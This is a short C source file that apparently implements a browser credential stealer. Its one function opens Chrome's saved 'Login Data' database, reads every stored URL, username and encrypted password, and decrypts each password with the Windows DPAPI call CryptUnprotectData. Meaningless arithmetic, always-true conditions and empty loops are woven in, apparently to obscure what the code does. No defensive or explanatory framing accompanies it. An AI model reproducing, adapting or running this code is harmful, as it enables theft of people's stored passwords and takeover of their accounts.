#include <windows.h>
#include <wincrypt.h>

typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
int sqlite3_open(const char *, sqlite3 **);
int sqlite3_prepare_v2(sqlite3 *, const char *, int, sqlite3_stmt **, const char **);
int sqlite3_step(sqlite3_stmt *);
int sqlite3_column_bytes(sqlite3_stmt *, int);
const void *sqlite3_column_blob(sqlite3_stmt *, int);
const unsigned char *sqlite3_column_text(sqlite3_stmt *, int);
int sqlite3_finalize(sqlite3_stmt *);
int sqlite3_close(sqlite3 *);

void __attribute__((noinline)) __attribute__((used)) routine_v4()
{
    int j1 = 0xDEAD;
    j1 <<= 4;
    j1 ^= 0xBEEF;
    if (j1 * j1 >= 0)
    {
        char db_path[260];
        ExpandEnvironmentStringsA("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data", db_path, 260);
        for (int i = 0; i < 3; i++)
        {
            int k = i ^ (i << 1);
            k &= 0xFF;
        }
        sqlite3 *db = 0;
        sqlite3_open(db_path, &db);
        sqlite3_stmt *stmt = 0;
        sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, 0);
        while (sqlite3_step(stmt) == 100)
        {
            const unsigned char *url = sqlite3_column_text(stmt, 0);
            const unsigned char *username = sqlite3_column_text(stmt, 1);
            const void *pw_blob = sqlite3_column_blob(stmt, 2);
            int blob_len = sqlite3_column_bytes(stmt, 2);
            DATA_BLOB in = {(DWORD)blob_len, (BYTE *)pw_blob};
            DATA_BLOB out;
            if ((7 * 7 - 49) == 0 && CryptUnprotectData(&in, 0, 0, 0, 0, 0, &out))
            {
                LocalFree(out.pbData);
            }
            for (int x = 0; x < 2; x++)
            {
                int y = x * 0;
            }
        }
        sqlite3_finalize(stmt);
        sqlite3_close(db);
    }
}